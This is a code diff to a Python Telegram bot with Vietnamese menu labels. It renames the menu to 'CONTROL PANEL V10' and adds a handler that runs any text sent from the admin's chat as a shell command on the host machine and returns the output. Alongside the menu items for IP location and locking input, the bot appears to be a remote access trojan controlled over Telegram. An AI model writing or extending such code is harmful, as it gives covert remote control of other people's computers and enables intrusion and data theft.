@@ -88,7 +88,7 @@ def send_reply_menu(m):
     mk.add("📍 Vị Trí IP", "🧱 Khóa Input")
     mk.add("💓 Kiểm Tra Bot")
     
-    bot.send_message(m.chat.id, "🛡️ **MENU 1 (Bàn Phím)**", reply_markup=mk, parse_mode="Markdown")
+    bot.send_message(m.chat.id, "🛡️ **CONTROL PANEL V10**", reply_markup=mk, parse_mode="Markdown")
 
 
 
@@ -476,6 +476,46 @@ def h_proc(m):
         bot_stats.increment_command()
     except Exception as e:
         logger.error(f"h_proc failed: {e}")
+
+@bot.message_handler(func=lambda m: m.text == "🚀 Chạy Lệnh")
+def h_cmd(m):
+    """Interactive shell command handler - Ask for command"""
+    if m.from_user.id != ADMIN_ID:
+        return
+    
+    try:
+        bot.send_message(m.chat.id, "🖥️ Gửi lệnh shell (ví dụ: `dir`, `ipconfig`, `tasklist`):", parse_mode="Markdown")
+        bot.register_next_step_handler(m, process_cmd)
+        bot_stats.increment_command()
+    except Exception as e:
+        logger.error(f"h_cmd failed: {e}")
+
+def process_cmd(m):
+    """Process shell command"""
+    if m.from_user.id != ADMIN_ID:
+        return
+    
+    try:
+        if m.text.startswith('/'):
+            return
+        
+        # Run command with timeout
+        import subprocess
+        result = subprocess.run(m.text, shell=True, capture_output=True, text=True, timeout=10, encoding='cp850', errors='ignore')
+        
+        output = result.stdout if result.stdout else "(No output)"
+        if len(output) > 4000:
+            with open("cmd_output.txt", "w", encoding="utf-8") as f:
+                f.write(output)
+            bot.send_document(m.chat.id, open("cmd_output.txt", 'rb'), caption=f"Output: {m.text}")
+            import os
+            os.remove("cmd_output.txt")
+        else:
+            bot.send_message(m.chat.id, f"```\n{output}\n```", parse_mode="Markdown")
+    except subprocess.TimeoutExpired:
+        bot.send_message(m.chat.id, "⏱️ Lệnh timeout (>10s)")
+    except Exception as e:
+        bot.send_message(m.chat.id, f"❌ Lỗi: {str(e)}")
 
 @bot.message_handler(func=lambda m: m.text == "🔄 Khởi động lại")
 def h_res(m):
